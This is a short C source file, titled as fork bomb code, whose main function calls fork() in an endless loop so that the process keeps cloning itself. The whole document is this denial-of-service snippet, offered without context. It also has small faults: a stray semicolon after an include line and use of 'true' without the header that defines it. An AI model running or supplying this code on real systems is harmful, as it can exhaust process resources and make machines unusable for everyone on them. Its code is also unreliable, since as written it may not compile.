#Forkbomb code

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>;

int main(int args,char **argv){
	while(true){
	//Fork just clone itself.
	fork();
	}
}
